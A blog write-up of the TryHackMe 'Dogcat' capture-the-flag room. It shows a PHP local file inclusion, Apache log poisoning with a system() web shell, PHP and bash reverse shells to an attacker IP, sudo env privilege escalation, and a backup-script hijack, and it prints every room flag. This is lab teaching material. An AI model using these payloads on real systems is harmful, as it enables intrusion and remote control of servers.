---
title: "Dogcat - TryHackMe"
author: Ludovic COULON
date: 2020-06-02
hero: ./images/hero.png
excerpt: "Writeup for the Dogcat room on TryHackMe"
---

[TryHackMe | Dogcat](https://tryhackme.com/room/dogcat)

<div className="Image__Small">
  <img src="https://i.imgur.com/mj1rbea.png" alt="blog_image" />
</div>

I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!

**This machine may take a few minutes to fully start up.**

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.121.12
```

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I

80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### #1 What is flag 1?

I'm going to try some basic LFI

<div className="Image__Medium">
  <img src="https://imgur.com/IeJGwlC.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/UMyhkfJ.png" alt="blog_image" />
</div>

I'm going to try with php filter let's see if this works..

[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)

<div className="Image__Medium">
  <img src="https://imgur.com/FXeOWux.png" alt="blog_image" />
</div>

```bash
php://filter/convert.base64-encode/resource=cat
# Let's decode the base64 to see the result
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```

<div className="Image__Medium">
  <img src="https://imgur.com/jF0hO89.png" alt="blog_image" />
</div>

Nice ! We can see the php code let's see if there is something in the directory

```bash
php://filter/convert.base64-encode/resource=./cat/../index
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

There we go ! We have the php code let's see if we can do something with it 🤤

So.. There is no way that we can exploit the php code so let's look at the nmap result and we have the apache version, let's see if we can see the log.

```bash
By default, you can find the Apache access log file at the following path:

    /var/log/apache/access. log.
    /var/log/apache2/access. log.
    /etc/httpd/logs/access_log.
```

If we try with this following url

```bash
php://filter/convert.base64-encode/resource=./cat/../../../../../../../../../../../../../var/log/apache2/access.log
```

There will be an error its because the code don't like the ".log" let's correct that 😃

On the php code there is this ternary condition "\$\_GET["ext"]" let's use that at the end

<div className="Image__Medium">
  <img src="https://imgur.com/25dLhcZ.png" alt="blog_image" />
</div>

Nice ! It worked !! 😵

Let's decode the base64 to see the result 😊

```bash
10.9.2.228 - - [02/Jun/2020:20:38:04 +0000] "GET /?view=php://filter/convert.base64-encode/resource=./cat/../../../../../../../../../../../../../var/log/apache2/access.log&ext HTTP/1.1" 200 2890 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

Now let's see if we can have an RCE attack 🤑

<div className="Image__Medium">
  <img src="https://imgur.com/gZZJUJR.png" alt="blog_image" />
</div>

And there it is ! If we put "<?php system($_GET['cmd']);?>" on the user-agent we can execute code on the remote server.

Let's get a reverse shell using the same method..

[php | GTFOBins](https://gtfobins.github.io/gtfobins/php/#reverse-shell)

```bash

php -r '$sock=fsockopen("10.9.2.228"),"",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<div className="Image__Small">
  <img src="https://imgur.com/2bjNiUu.png" alt="blog_image" />
</div>

```bash
$ cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

### #2 What is flag 2?

```bash
$ cd ..
$ pwd
/var/www
$ ls
flag2_QMW7JvaY2LvK.txt
html
$ cat flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```

### #3 What is flag 3?

```bash
$ sudo -l
Matching Defaults entries for www-data on 17d35d82c239:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 17d35d82c239:
    (root) NOPASSWD: /usr/bin/env
```

[https://gtfobins.github.io/gtfobins/env/#sudo](https://gtfobins.github.io/gtfobins/env/#sudo)

```bash
sudo env /bin/sh
```

```bash
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

### #4 What is flag 4?

```bash
find / -type f -name *.sh 2>/dev/null
/opt/backups/backup.sh
/etc/init.d/hwclock.sh
/lib/init/vars.sh
/usr/local/lib/php/build/ltmain.sh
/usr/share/debconf/confmodule.sh
```

```bash
cd /opt/backups
ls
backup.sh
backup.tar
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Let's add a reverse shell on the bash script and get hopefully the last flag 🤓

```bash
echo '#!/bin/bash' > backup.sh;echo 'bash -i >& /dev/tcp/10.9.2.228/9002 0>&1' >> backup.sh
```

```bash
➜  ~ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.9.2.228] from (UNKNOWN) [10.10.121.12] 43500
bash: cannot set terminal process group (5464): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4*
cat flag4*
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~#
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/kUD3W5P.png" alt="TryhackMeProfile" />
  </a>
</center>
